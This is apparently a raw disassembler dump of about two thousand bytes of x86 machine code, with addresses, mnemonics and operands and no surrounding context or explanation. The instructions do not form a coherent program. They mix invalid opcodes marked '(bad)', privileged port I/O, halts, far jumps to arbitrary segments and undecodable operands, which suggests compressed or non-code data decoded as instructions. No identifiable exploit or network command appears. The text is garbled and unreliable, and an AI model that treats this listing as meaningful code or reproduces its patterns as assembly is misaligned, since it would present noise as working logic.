  4264db:	ins    DWORD PTR es:[edi],dx
  4264dc:	in     eax,dx
  4264dd:	leave  
  4264de:	inc    edi
  4264df:	lods   eax,DWORD PTR ds:[esi]
  4264e0:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  4264e1:	dec    ebp
  4264e2:	or     DWORD PTR [eax],0x1f3a7a44
  4264e8:	jp     0x4264ce
  4264ea:	pop    ecx
  4264eb:	(bad)  
  4264ed:	mov    al,ds:0xc30e7d74
  4264f2:	aas    
  4264f3:	or     BYTE PTR [ebx-0x29],ch
  4264f6:	cmp    cl,BYTE PTR [ebx]
  4264f8:	lahf   
  4264f9:	jnp    0x426507
  4264fb:	pop    ds
  4264fc:	or     dl,bl
  4264fe:	inc    ecx
  4264ff:	sbb    ch,BYTE PTR [edi]
  426501:	lods   eax,DWORD PTR ds:[esi]
  426502:	jl     0x4264aa
  426504:	dec    ebx
  426505:	bound  ebp,QWORD PTR [eax+eax*2+0x74]
  426509:	in     eax,0xec
  42650b:	pop    eax
  42650c:	push   edi
  42650d:	push   edi
  42650e:	and    bl,ah
  426510:	xor    edx,edi
  426512:	inc    ebx
  426513:	mov    eax,ds:0x424eb27d
  426518:	mov    eax,ds:0xd3700d4c
  42651d:	sar    DWORD PTR [edi-0xb],1
  426520:	repnz and al,0x1f
  426523:	lock xchg esp,eax
  426525:	jge    0x42653b
  426527:	pop    ebp
  426528:	scas   al,BYTE PTR es:[edi]
  426529:	inc    edi
  42652a:	adc    bl,BYTE PTR [edi-0x1f]
  42652d:	xor    esp,eax
  42652f:	loop   0x42656e
  426531:	fcmovbe st,st(4)
  426533:	xchg   dh,dh
  426535:	test   eax,0xcc82767f
  42653a:	xchg   ebx,eax
  42653b:	hlt    
  42653c:	in     eax,dx
  42653d:	or     edx,ecx
  42653f:	pop    esp
  426540:	push   cs
  426541:	ins    BYTE PTR es:[edi],dx
  426542:	sub    ah,BYTE PTR [edi+0x42dfdfa2]
  426548:	paddd  mm1,QWORD PTR [esi+0x1f198aae]
  42654f:	in     al,0xf7
  426551:	mov    ah,0x4
  426553:	hlt    
  426554:	lea    esp,[ebp+0x42]
  426557:	jmp    0x426520
  426559:	dec    esp
  42655a:	stos   BYTE PTR es:[edi],al
  42655b:	xchg   esp,eax
  42655c:	scas   eax,DWORD PTR es:[edi]
  42655d:	mov    ds:0xb7e9436,eax
  426562:	push   cs
  426563:	add    al,0xca
  426565:	xor    DWORD PTR [ecx-0x2],0x14
  426569:	pop    ds
  42656a:	test   BYTE PTR [ebx-0x6bd3cfb5],0xeb
  426571:	push   edx
  426572:	mov    dl,0x26
  426574:	lock daa 
  426576:	mov    dh,BYTE PTR [eax+0x7bcf4d64]
  42657c:	ud1    edx,DWORD PTR [ebx]
  42657f:	inc    edx
  426580:	push   es
  426581:	push   ebx
  426582:	push   esi
  426583:	mov    edx,0xcb0cb79a
  426588:	ja     0x42657a
  42658a:	and    dh,cl
  42658c:	push   0x7a
  42658e:	pushf  
	...
  426597:	add    BYTE PTR [eax],al
  426599:	add    BYTE PTR [ebp+0x4f3707c0],cl
  42659f:	idiv   DWORD PTR [ebp-0x7c857b06]
  4265a5:	jg     0x426611
  4265a7:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  4265a8:	dec    esi
  4265a9:	aas    
  4265aa:	sbb    esp,0x1fd0001
  4265b0:	add    BYTE PTR [eax],al
  4265b2:	(bad)  
  4265b3:	fild   DWORD PTR [ecx+0x2c14fc39]
  4265b9:	jns    0x4265a2
  4265bb:	sbb    ch,ah
  4265bd:	sbb    eax,0x4c0f3782
  4265c2:	retf   
  4265c3:	add    DWORD PTR [eax-0x49],edi
  4265c6:	xchg   ecx,eax
  4265c7:	cmp    DWORD PTR [edx+0x44],0xbe56d1e
  4265ce:	xchg   edx,eax
  4265cf:	int3   
  4265d0:	sub    eax,0x4397d3c
  4265d5:	jnp    0x4265a8
  4265d7:	ja     0x426652
  4265d9:	ficomp DWORD PTR [edi]
  4265db:	mov    al,0x8
  4265dd:	xsaveopt ds:0x43bade42
  4265e4:	add    BYTE PTR [esi+0x2a],0x1
  4265e8:	sbb    ebp,eax
  4265ea:	mov    cs,esi
  4265ec:	fimul  DWORD PTR [ebx+0x7a]
  4265ef:	loopne 0x42663a
  4265f1:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  4265f2:	adc    al,0xeb
  4265f4:	data16 stc 
  4265f6:	mov    ah,0x11
  4265f8:	dec    edi
  4265f9:	out    dx,eax
  4265fa:	mov    bh,0x19
  4265fc:	or     ah,bh
  4265fe:	stos   DWORD PTR es:[edi],eax
  4265ff:	std    
  426600:	cmp    BYTE PTR [edi+0x3fd24b18],ah
  426606:	aam    0xeb
  426608:	cs popa 
  42660a:	sub    dl,BYTE PTR [eax+0x53]
  42660d:	ret    0x46a5
  426610:	sbb    eax,ebp
  426612:	out    dx,eax
  426613:	sar    DWORD PTR [edx+0x5f],1
  426616:	pop    ecx
  426617:	sub    eax,0xe051780e
  42661c:	stc    
  42661d:	sub    DWORD PTR [ecx+0x4d],edx
  426620:	out    0x78,eax
  426622:	nop
  426623:	inc    ebx
  426624:	mov    ch,0x41
  426626:	out    0x8f,eax
  426628:	leave  
  426629:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  42662a:	es cli 
  42662c:	int    0x41
  42662e:	ror    dh,0xe8
  426631:	jno    0x426638
  426633:	bound  eax,QWORD PTR [ecx-0x80]
  426636:	hlt    
  426637:	sti    
  426638:	addr16 ss and al,0xd3
  42663c:	lea    ebp,[ebx+0xc53e0fb]
  426642:	nop
  426643:	mov    ebp,0xea6f946a
  426648:	mov    edx,0xdb78b86e
  42664d:	cdq    
  42664e:	mov    ah,0x9e
  426650:	into   
  426651:	imul   ebx,DWORD PTR [edx],0x4f
  426654:	xchg   ecx,eax
  426655:	test   bh,al
  426657:	icebp  
  426658:	test   al,0x92
  42665a:	adc    eax,0x522098e6
  42665f:	in     eax,0x59
  426661:	loop   0x426671
  426663:	mov    esi,0xf4e83f34
  426668:	fist   WORD PTR [edx+ebp*2-0x5d6adfe0]
  42666f:	sbb    ah,BYTE PTR [edi-0x117667ba]
  426675:	jnp    0x42668e
  426677:	dec    eax
  426679:	dec    ebx
  42667a:	cmp    BYTE PTR [ebx],bl
  42667c:	ss leave 
  42667e:	mov    esi,0xbbd205b8
  426683:	jp     0x4266ba
  426685:	and    edx,esp
  426687:	dec    ebx
  426688:	repz imul ecx,edx,0x1c6c473
  42668f:	scas   eax,DWORD PTR es:[edi]
  426690:	fadd   QWORD PTR [edi]
  426692:	pop    ebp
  426693:	jmp    0x9ea92524
  426698:	rol    BYTE PTR [ebx],cl
  42669a:	out    0x44,al
  42669c:	jp     0x426642
  42669e:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  42669f:	jl     0x4266a0
  4266a1:	sysenter 
  4266a3:	loope  0x426724
  4266a5:	out    dx,al
  4266a6:	mov    cl,0xec
  4266a8:	push   esi
  4266a9:	repnz mov dl,0x39
  4266ac:	std    
  4266ad:	mov    ebx,0x89626d2f
  4266b2:	or     al,0x11
  4266b4:	ja     0x42671a
  4266b6:	and    ebp,ebp
  4266b8:	mov    ?,WORD PTR [ebx+0xa]
  4266bb:	mov    ebp,0x40acef43
  4266c0:	out    0x52,al
  4266c2:	in     eax,dx
  4266c3:	sbb    edi,edi
  4266c5:	dec    ecx
  4266c6:	mov    ebp,0x529286d9
  4266cb:	mov    ?,WORD PTR [ebx+0x45]
  4266ce:	sbb    al,0xb6
  4266d0:	and    eax,0x9b56f6c1
  4266d5:	sar    DWORD PTR [esi-0x42],1
  4266d8:	aaa    
  4266d9:	push   cs
  4266da:	lea    esp,[edi-0x7fd49a67]
  4266e0:	adc    eax,0x67143011
  4266e5:	leave  
  4266e6:	or     ebp,DWORD PTR [edi]
  4266e8:	repnz retf 0x3e7f
  4266ec:	stos   BYTE PTR es:[edi],al
  4266ed:	call   0x39e7:0x12aecd70
  4266f4:	add    ah,cl
  4266f6:	adc    ch,ch
  4266f8:	inc    esp
  4266f9:	sub    edi,DWORD PTR [edi+0x62]
  4266fc:	imul   esi,DWORD PTR gs:[edx+0x10ffd58e],0x39
  426704:	dec    edi
  426705:	mov    esp,0x8b2c3f1b
  42670a:	jg     0x4266e5
  42670c:	aad    0xc
  42670e:	push   esp
  42670f:	and    ebx,DWORD PTR [eax-0x1]
  426712:	cdq    
  426713:	sub    ebp,eax
  426715:	mov    edx,0xc83f6d78
  42671a:	xor    al,0x1e
  42671c:	fisubr WORD PTR [eax]
  42671e:	sbb    DWORD PTR [eax+ecx*4],0x61d946d
  426725:	and    BYTE PTR [ebx+eax*4-0x3ecd16e0],0xa2
  42672d:	pop    ss
  42672e:	push   edx
  42672f:	pop    ecx
  426730:	(bad)  
  426731:	(bad)  
  426733:	add    BYTE PTR [edx+0x25],cl
  426736:	jae    0x426755
  426738:	xchg   BYTE PTR [esi-0x65b35dd4],al
  42673e:	daa    
  42673f:	mov    bh,BYTE PTR [ecx+0x2e]
  426742:	sbb    BYTE PTR [esi-0x7ce6db65],dh
  426748:	pop    ebp
  426749:	mov    bl,0x42
  42674b:	xor    eax,DWORD PTR [ecx+0x1e17aa52]
  426751:	retf   0x1a88
  426754:	jg     0x4267ae
  426756:	pop    edx
  426757:	js     0x4267a1
  426759:	rcl    DWORD PTR [ecx+0x35],cl
  42675c:	push   ecx
  42675d:	stos   DWORD PTR es:[edi],eax
  42675e:	ret    0xbfe2
  426761:	pusha  
  426762:	mov    ds:0xa550be81,al
  426767:	aam    0x87
  426769:	call   0x5d63152b
  42676e:	fiadd  WORD PTR [ebx+0x22]
  426771:	jb     0x42677e
  426773:	jecxz  0x42679c
  426775:	jne    0x426708
  426777:	fidivr DWORD PTR [esi-0x10]
  42677a:	adc    cl,BYTE PTR [ebx+0x22e1c3dc]
  426780:	or     esp,esi
  426782:	and    ecx,DWORD PTR [edx+0x419e6bec]
  426788:	mov    ebx,0x5c6ccd3b
  42678d:	sbb    al,0x34
  42678f:	mov    al,ds:0x479543c
  426794:	jl     0x42677f
  426796:	cdq    
  426797:	retf   
  426798:	(bad)  
  426799:	fisub  WORD PTR [ebx+0x351824fd]
  42679f:	mov    al,ds:0x9180d744
  4267a4:	stos   DWORD PTR es:[edi],eax
  4267a5:	clc    
  4267a6:	mov    ah,0x70
  4267a8:	and    al,0xbc
  4267aa:	imul   esi,DWORD PTR [esi+ebp*8],0xffffffee
  4267ae:	mov    dh,0x0
	...
  4267b8:	add    BYTE PTR [eax],al
  4267ba:	mov    al,0x8a
  4267bc:	call   0xfa266242
  4267c1:	mov    ebx,0xcae72888
  4267c6:	les    eax,FWORD PTR [esi-0x21815302]
  4267cc:	add    DWORD PTR [eax],eax
  4267ce:	std    
  4267cf:	add    DWORD PTR [eax],eax
  4267d1:	add    BYTE PTR [edi],cl
  4267d3:	mov    ebp,ebp
  4267d5:	inc    edi
  4267d6:	push   esi
  4267d7:	int    0x58
  4267d9:	shl    DWORD PTR [esi+0x28],0xfb
  4267dd:	shl    ecx,1
  4267df:	data16 vpmacswd xmm0,xmm7,xmm2,XMMWORD PTR [ebp-0xc]
  4267e7:	sbb    eax,0xefcbf918
  4267ec:	mov    bl,0x24
  4267ee:	fisttp DWORD PTR [eax+0x689c6e87]
  4267f4:	fmul   DWORD PTR [eax+0x62]
  4267f7:	fisub  WORD PTR [eax+ecx*4+0x3e8062c]
  4267fe:	popa   
  4267ff:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  426800:	pop    eax
  426801:	inc    cl
  426803:	out    dx,al
  426804:	outs   dx,DWORD PTR ds:[esi]
  426805:	call   0x863e:0x511deea0
  42680c:	dec    ebp
  42680d:	mov    ebp,DWORD PTR [edi-0x732e949e]
  426813:	rol    DWORD PTR [esi],1
  426815:	mov    ss,esi
  426817:	and    dh,BYTE PTR [ecx]
  426819:	call   ecx
  42681b:	or     BYTE PTR [ecx+0x36],0xcc
  42681f:	inc    edi
  426820:	ins    DWORD PTR es:[edi],dx
  426821:	inc    edi
  426822:	sti    
  426823:	in     eax,0xf6
  426825:	xor    edx,DWORD PTR [edx-0x6e5ba963]
  42682b:	cdq    
  42682c:	lea    ebp,[ecx+0x2f]
  42682f:	mov    eax,0x95fca754
  426834:	jmp    0x5bce:0xeceb9b09
  42683b:	outs   dx,DWORD PTR ds:[esi]
  42683c:	and    eax,esi
  42683e:	xchg   esi,eax
  42683f:	rep lods al,BYTE PTR ds:[esi]
  426841:	and    ecx,edi
  426843:	cdq    
  426844:	cmp    BYTE PTR [edx+0x48c1f847],dl
  42684a:	mov    esp,DWORD PTR cs:[esi+0x2edec577]
  426851:	imul   esi,DWORD PTR [edi-0x3c],0x62e356d8
  426858:	loopne 0x426884
  42685a:	push   esp
  42685b:	outs   dx,BYTE PTR ds:[esi]
  42685c:	jae    0x4268d4
  42685e:	(bad)  
  42685f:	pop    ecx
  426860:	fdivr  QWORD PTR [ebx+esi*8-0x376dd5]
  426867:	in     eax,0x6
  426869:	and    ebp,DWORD PTR [edi+ebp*4-0xe]
  42686d:	aaa    
  42686e:	aam    0x22
  426870:	cmp    DWORD PTR [edx-0x536c1f71],edi
  426876:	add    bl,bl
  426878:	lods   al,BYTE PTR ds:[esi]
  426879:	daa    
  42687a:	call   0xd7a24910
  42687f:	sar    BYTE PTR [edi],cl
  426881:	jle    0x426866
  426883:	xor    edi,DWORD PTR [edi+0x62ea6cd8]
  426889:	outs   dx,DWORD PTR ds:[esi]
  42688a:	frstor [esi]
  42688c:	jne    0x4268e6
  42688e:	adc    eax,0x6def85bd
  426893:	inc    edi
  426894:	jg     0x42687b
  426896:	mov    ecx,0x1c7dc943
  42689b:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  42689c:	icebp  
  42689d:	in     eax,0xa3
  42689f:	hlt    
  4268a0:	cld    
  4268a1:	push   ebx
  4268a2:	xchg   esi,eax
  4268a3:	jle    0x42682c
  4268a5:	xor    BYTE PTR [esi+esi*1],cl
  4268a8:	js     0x4268bc
  4268aa:	cdq    
  4268ab:	in     al,dx
  4268ac:	and    ebp,0x872abc30
  4268b2:	hlt    
  4268b3:	push   cs
  4268b4:	iret   
  4268b5:	jae    0x42686f
  4268b7:	sub    esi,edx
  4268b9:	add    esi,DWORD PTR [edi+esi*1]
  4268bc:	loop   0x426894
  4268be:	pusha  
  4268bf:	rcr    BYTE PTR [ebx+0x61fe299c],1
  4268c5:	and    esp,DWORD PTR [esi+0x70]
  4268c8:	cmp    eax,0xae2279d7
  4268cd:	xchg   BYTE PTR [edx+esi*2+0x7216d213],ah
  4268d4:	imul   esp,DWORD PTR [ecx],0x5d546f14
  4268da:	push   ecx
  4268db:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  4268dc:	aam    0xf2
  4268de:	push   cs
  4268df:	arpl   bp,di
  4268e1:	jbe    0x4268d9
  4268e3:	and    DWORD PTR [ebx],edi
  4268e5:	push   cs
  4268e6:	jns    0x4268b2
  4268e8:	adc    bh,bl
  4268ea:	mov    esi,0x574bb259
  4268ef:	adc    BYTE PTR [edi+0x4b],bh
  4268f2:	mov    esi,edi
  4268f4:	ret    
  4268f5:	and    DWORD PTR [edi-0x20],0x1e
  4268f9:	aad    0x28
  4268fb:	push   eax
  4268fc:	in     eax,0x16
  4268fe:	xchg   ebp,eax
  4268ff:	push   0xe076730d
  426904:	and    ebx,esp
  426906:	jmp    0x1af:0x1b620f61
  42690d:	daa    
  42690e:	rcr    bh,1
  426910:	out    dx,eax
  426911:	xchg   BYTE PTR [ecx+0x39],ah
  426914:	popa   
  426915:	adc    ch,BYTE PTR [esi]
  426917:	dec    ebp
  426918:	push   cs
  426919:	xchg   ebp,eax
  42691a:	out    0xd8,eax
  42691c:	int    0x47
  42691e:	push   edi
  42691f:	in     al,dx
  426920:	loope  0x4268a9
  426922:	cli    
  426923:	rcl    al,cl
  426925:	(bad)  
  426927:	mov    ch,0x3
  426929:	and    ebx,DWORD PTR [esi+0x11]
  42692c:	ins    DWORD PTR es:[edi],dx
  42692d:	mov    cl,0x90
  42692f:	add    edi,DWORD PTR [edx+0x64786d88]
  426935:	sub    DWORD PTR [esp+eiz*8-0x11c3415a],ebx
  42693c:	je     0x4268f7
  42693e:	int3   
  42693f:	cld    
  426940:	out    dx,al
  426941:	push   ss
  426942:	rol    BYTE PTR [ecx],1
  426944:	push   0x3879d694
  426949:	test   al,0xc9
  42694b:	es cli 
  42694d:	fwait
  42694e:	mov    bl,0x4b
  426950:	xchg   ebx,eax
  426951:	xor    esi,DWORD PTR [eax]
  426953:	jnp    0x42690d
  426955:	add    DWORD PTR [ebx+0x11ee9e12],ecx
  42695b:	pop    ss
  42695c:	inc    edi
  42695d:	sahf   
  42695e:	cmp    dh,BYTE PTR [edi+0x358cd1a3]
  426964:	into   
  426965:	shr    bl,cl
  426967:	test   al,0x10
  426969:	pop    ss
  42696a:	cmp    esi,DWORD PTR [edx]
  42696c:	dec    ebp
  42696d:	sbb    eax,eax
  42696f:	ins    BYTE PTR es:[edi],dx
  426970:	out    dx,al
  426971:	add    ebx,DWORD PTR [edi+0x27dbf8f7]
  426977:	cmp    al,0xbf
  426979:	sbb    al,0x11
  42697b:	push   0x2c
  42697d:	fstp   TBYTE PTR [edx-0x40]
  426980:	mov    ebx,DWORD PTR [esi+0x7e7c5d82]
  426986:	cmc    
  426987:	lea    eax,[edx]
  426989:	jae    0x426965
  42698b:	mov    dh,0xfa
  42698d:	je     0x426979
  42698f:	retf   0x8e1b
  426992:	adc    eax,0xc420313b
  426997:	call   0xb96:0xf3c1e934
  42699e:	out    dx,eax
  42699f:	add    bh,BYTE PTR [edi-0x41]
  4269a2:	dec    esp
  4269a3:	inc    eax
  4269a4:	icebp  
  4269a5:	mov    DWORD PTR [edi],edi
  4269a7:	mov    ecx,0x8db73098
  4269ac:	pusha  
  4269ad:	(bad)  
  4269ae:	mov    ah,0xb5
  4269b0:	out    dx,al
  4269b1:	in     al,dx
  4269b2:	xor    dh,BYTE PTR [edx]
  4269b4:	lods   eax,DWORD PTR ds:[esi]
  4269b5:	dec    ebx
  4269b6:	aas    
  4269b7:	pop    ebx
  4269b8:	and    al,0xff
  4269ba:	and    bl,bh
  4269bc:	jp     0x4269a1
  4269be:	inc    edi
  4269bf:	mov    bl,BYTE PTR [ecx]
  4269c1:	push   ebx
  4269c2:	pusha  
  4269c3:	xchg   DWORD PTR [ecx-0x79],eax
  4269c6:	test   BYTE PTR ds:0x646cd3f0,bl
  4269cc:	shr    DWORD PTR [ecx+0x3d],cl
	...
  4269d7:	add    BYTE PTR [eax],al
  4269d9:	add    BYTE PTR [edx-0x39253b74],cl
  4269df:	ficomp DWORD PTR [esi+0xc235fdc]
  4269e5:	mov    ch,BYTE PTR [ebx+0x67]
  4269e8:	jg     0x426a55
  4269ea:	jnp    0x4269cc
  4269ec:	add    DWORD PTR [eax],eax
  4269ee:	std    
  4269ef:	add    DWORD PTR [eax],eax
  4269f1:	add    BYTE PTR [eax-0x37b2345b],dl
  4269f7:	xchg   esp,eax
  4269f8:	cmp    eax,0xa346576b
  4269fd:	pop    ss
  4269fe:	dec    edx
  4269ff:	cli    
  426a00:	pop    es
  426a01:	mov    bh,0x30
  426a03:	jno    0x426a64
  426a05:	popa   
  426a06:	dec    ebx
  426a07:	adc    DWORD PTR [edi+0x36],ecx
  426a0a:	fdiv   st(0),st
  426a0c:	test   eax,0x7e8c47dc
  426a11:	xor    edx,DWORD PTR [ebp+0x6c]
  426a14:	dec    edi
  426a15:	sbb    eax,0xeb37dd71
  426a1a:	push   edi
  426a1b:	jl     0x426a52
  426a1d:	iret   
  426a1e:	adc    al,0xf3
  426a20:	cmp    DWORD PTR [ebp-0x6a],eax
  426a23:	push   edi
  426a24:	dec    esp
  426a25:	test   cl,cl
  426a27:	js     0x426a6c
  426a29:	jae    0x4269c8
  426a2b:	jae    0x4269e2
  426a2d:	outs   dx,DWORD PTR ds:[esi]
  426a2e:	pop    es
  426a2f:	sub    eax,DWORD PTR [esi+0x53]
  426a32:	jo     0x4269f9
  426a34:	mov    dh,0x8f
  426a36:	and    al,0xc3
  426a38:	xchg   ebp,eax
  426a39:	dec    eax
  426a3a:	pop    ds
  426a3b:	adc    ecx,DWORD PTR [ecx]
  426a3d:	mov    edx,0x8ecbcf89
  426a42:	js     0x426a21
  426a44:	(bad)  
  426a45:	push   edx
  426a46:	push   ebx
  426a47:	xor    bl,bl
  426a49:	xor    al,0x7b
  426a4b:	push   es
  426a4c:	xor    DWORD PTR [edi+0x584aa506],0x724009e4
  426a56:	jg     0x426a96
  426a58:	es es pop edi
  426a5b:	ins    BYTE PTR es:[edi],dx
  426a5c:	sbb    eax,0x443bea13
  426a61:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  426a62:	fwait
  426a63:	cmp    ebp,DWORD PTR [ebp+0x6300c72a]
  426a69:	lahf   
  426a6a:	jbe    0x426a95
  426a6c:	addr16 mov ebp,0x8c1de403
  426a72:	mov    esi,0x1926434d
  426a77:	pop    ss
  426a78:	pop    eax
  426a79:	xor    esp,esi
  426a7b:	adc    al,0x7d
  426a7d:	out    0xd8,eax
  426a7f:	and    BYTE PTR [ecx+eax*1],bh
  426a82:	hlt    
  426a83:	lds    ebx,FWORD PTR [ecx-0x68]
  426a86:	jno    0x426a0a
  426a88:	mov    al,0x6a
  426a8a:	cld    
  426a8b:	jp     0x426a1e
  426a8d:	(bad)  
  426a8f:	mov    eax,DWORD PTR [ebp-0x2e]
  426a92:	mov    al,ds:0x611a343a
  426a97:	adc    eax,0x46669181
  426a9c:	(bad)  
  426a9d:	push   esp
  426a9e:	xor    al,BYTE PTR [edx+0x8]
  426aa1:	mov    bl,0x70
  426aa3:	mov    ds:0xc6336e05,eax
  426aa8:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  426aa9:	je     0x426a75
  426aab:	data16 clc 
  426aad:	jmp    0xbb897dcd
  426ab2:	es mov bl,0x3e
  426ab5:	mov    dh,0x7f
  426ab7:	mov    ebp,0xf96ef50d
  426abc:	or     DWORD PTR [ebx+0x6d3f7f8d],eax
  426ac2:	pop    ebp
  426ac3:	pop    esi
  426ac4:	out    dx,al
  426ac5:	sbb    bh,BYTE PTR [edx]
  426ac7:	iret   
  426ac8:	popf   
  426ac9:	ret    
  426aca:	popa   
  426acb:	sbb    al,0xd7
  426acd:	push   0xffffffff
  426acf:	dec    edx
  426ad0:	jg     0x426afd
  426ad2:	dec    esi
  426ad3:	add    eax,0xad1c3252
  426ad8:	push   edx
  426ad9:	scas   eax,DWORD PTR es:[edi]
  426ada:	popf   
  426adb:	cmp    esp,DWORD PTR [edi-0x64]
  426ade:	or     eax,0x4c22b57a
  426ae3:	push   DWORD PTR [eax-0x35]
  426ae6:	test   eax,0x49307332
  426aeb:	push   edx
  426aec:	jbe    0x426ae2
  426aee:	inc    edx
  426aef:	pop    ds
  426af0:	adc    al,0x8b
  426af2:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  426af3:	or     al,0x6
  426af5:	mov    bh,0x8f
  426af7:	loope  0x426a86
  426af9:	mov    dh,0xe5
  426afb:	add    BYTE PTR ds:[ecx+0x2],dh
  426aff:	xchg   DWORD PTR [ebx],edi
  426b01:	in     eax,0xa0
  426b03:	push   es
  426b04:	cmp    BYTE PTR [ecx+edi*1],0xc8
  426b08:	adc    al,0x57
  426b0a:	jl     0x426a9c
  426b0c:	adc    al,0x2
  426b0e:	daa    
  426b0f:	cli    
  426b10:	arpl   WORD PTR [esi+0x2b6c4316],ax
  426b16:	xor    al,0x29
  426b18:	rdtsc  
  426b1a:	inc    edx
  426b1b:	rcl    BYTE PTR [ecx-0x3c],cl
  426b1e:	fwait
  426b1f:	sti    
  426b20:	inc    ebp
  426b21:	mov    edi,0x7d9c4c63
  426b26:	(bad)  
  426b27:	lock std 
  426b29:	addr16 xchg esp,eax
  426b2b:	scas   eax,DWORD PTR es:[edi]
  426b2c:	mov    DWORD PTR [ebx],ebx
  426b2e:	pop    ebp
  426b2f:	sbb    DWORD PTR [ebx+edi*8+0x34],ebp
  426b33:	test   eax,0x2a5e4a33
  426b38:	xchg   dh,ch
  426b3a:	popa   
  426b3b:	sbb    BYTE PTR [ecx],ah
  426b3d:	fdiv   QWORD PTR [edx-0x76]
  426b40:	(bad)  
  426b41:	sbb    dh,dl
  426b43:	push   esp
  426b44:	sub    dh,BYTE PTR [edx+esi*4-0x3b]
  426b48:	popf   
  426b49:	dec    DWORD PTR [edi-0x6d7e63be]
  426b4f:	mov    esi,0xed44414
  426b54:	arpl   WORD PTR [edi-0x35],ax
  426b57:	mov    al,0x75
  426b59:	shr    bh,0xcc
  426b5c:	cwde   
  426b5d:	xlat   BYTE PTR ds:[ebx]
  426b5e:	jmp    0x426ae0
  426b60:	out    dx,al
  426b61:	add    bh,dl
  426b63:	fisttp DWORD PTR [esp+ebp*4-0x3d]
  426b67:	and    DWORD PTR [edx],edi
  426b69:	mov    dl,0xfd
  426b6b:	adc    edx,DWORD PTR [ebp+0x32264a9b]
  426b71:	int3   
  426b72:	jo     0x426bc6
  426b74:	mov    eax,0x48d63df5
  426b79:	mov    ah,0x5d
  426b7b:	lahf   
  426b7c:	sbb    dl,ch
  426b7e:	or     eax,0x85cc1532
  426b83:	and    eax,0x1c5673d6
  426b88:	cmp    eax,DWORD PTR [esi-0xa]
  426b8b:	xor    al,0x5a
  426b8d:	adc    BYTE PTR [eax],bl
  426b8f:	add    DWORD PTR [esi-0x6c],edx
  426b92:	mov    ebp,0x59c6a197
  426b97:	scas   eax,DWORD PTR es:[edi]
  426b98:	xchg   edi,eax
  426b99:	jo     0x426b24
  426b9b:	xor    ah,dl
  426b9d:	repz jb 0x426bb1
  426ba0:	(bad)  
  426ba1:	aad    0x79
  426ba3:	add    eax,0xf1a5bc47
  426ba8:	jb     0x426b80
  426baa:	mov    dl,0x63
  426bac:	pop    ebp
  426bad:	out    0xc3,al
  426baf:	and    DWORD PTR [ebx+0x50],eax
  426bb2:	adc    DWORD PTR [eax+0x3a],esp
  426bb5:	add    al,0x9
  426bb7:	es (bad) 
  426bb9:	or     BYTE PTR [bx+0xa1c],dl
  426bbe:	mov    eax,ds:0xc46f449a
  426bc3:	mov    eax,0xd28a6484
  426bc8:	mov    esi,0xe45e9954
  426bcd:	test   esi,ebx
  426bcf:	mov    eax,ds:0x8ebc620d
  426bd4:	das    
  426bd5:	lock and DWORD PTR [esi],ecx
  426bd8:	fisubr DWORD PTR [ebp-0x1e]
  426bdb:	gs ds pushf 
  426bde:	xor    al,0xc5
  426be0:	add    eax,0x6ec0e8e9
  426be5:	push   edi
  426be6:	pop    ss
  426be7:	bound  ecx,QWORD PTR [ebx-0x75b94116]
  426bed:	mov    esi,0xd8
	...
  426bfa:	inc    eax
  426bfb:	stos   BYTE PTR es:[edi],al
  426bfc:	pop    edx
  426bfd:	sbb    bh,dl
  426bff:	cli    
  426c00:	inc    eax
  426c01:	cli    
  426c02:	mov    ds:0xcdfe433f,al
  426c07:	pop    ss
  426c08:	(bad)  
  426c09:	sar    BYTE PTR [eax-0x1e],cl
  426c0c:	add    DWORD PTR [eax],eax
  426c0e:	std    
  426c0f:	add    DWORD PTR [eax],eax
  426c11:	add    BYTE PTR [edi],bh
  426c13:	cwde   
  426c14:	sbb    eax,0x34f19787
  426c19:	mov    eax,0x208a4855
  426c1e:	or     DWORD PTR [ecx-0xf],eax
  426c21:	inc    ebx
  426c22:	jo     0x426c99
  426c24:	in     eax,dx
  426c25:	test   cl,bl
  426c27:	call   0x3e36:0x6983c644
  426c2e:	xchg   esp,eax
  426c2f:	aas    
  426c30:	mov    ax,WORD PTR [esi*4-0x39542aa]
  426c38:	adc    BYTE PTR [ecx+0x5a11c1ea],bl
  426c3e:	inc    edx
  426c3f:	or     ah,BYTE PTR [edi-0x4dd6f3e1]
  426c45:	push   0xc1ea3e77
  426c4a:	enter  0x4d1b,0xc6
  426c4e:	clc    
  426c4f:	adc    DWORD PTR [edx-0x23],0xd9093ad1
  426c56:	mov    WORD PTR [edi+0x1a],fs
  426c59:	or     ecx,DWORD PTR [ecx+0x3e]
  426c5c:	push   eax
  426c5d:	(bad)  
  426c5e:	sbb    BYTE PTR [ebx-0x175b2fbe],bl
  426c64:	inc    edx
  426c65:	mov    ds:0x4f7894bb,al
  426c6a:	push   eax
  426c6b:	notrack call edi
  426c6e:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  426c6f:	sbb    al,0x76
  426c71:	xor    DWORD PTR [ebp+0x74],0x38
  426c75:	cmp    bh,0xe
  426c78:	pusha  
  426c79:	and    DWORD PTR [edi],esi
  426c7b:	leave  
  426c7c:	mov    cl,BYTE PTR [ecx]
  426c7e:	inc    esi
  426c7f:	ror    ebx,0xc7
  426c82:	gs ret 
  426c84:	aas    
  426c85:	dec    eax
  426c86:	mov    eax,DWORD PTR [eax]
  426c88:	jne    0x426cdd
  426c8a:	cmp    al,0xe0
  426c8c:	jb     0x426c7f
  426c8e:	sahf   
  426c8f:	shr    BYTE PTR [ebp+0x2b6a1639],1
  426c95:	call   0x7c8:0xfc764539
  426c9c:	adc    esi,ecx
  426c9e:	mov    bl,0x11
  426ca0:	jo     0x426cff
  426ca2:	add    DWORD PTR [esi+ebx*8],esp
  426ca5:	sti    
  426ca6:	pusha  
  426ca7:	cli    
  426ca8:	xchg   esp,eax
  426ca9:	(bad)  
  426caa:	lahf   
  426cab:	jo     0x426d24
  426cad:	jae    0x426d0e
  426caf:	mov    dl,0x99
  426cb1:	cwde   
  426cb2:	push   esp
  426cb3:	adc    eax,0x7b5721df
  426cb8:	in     al,0xa0
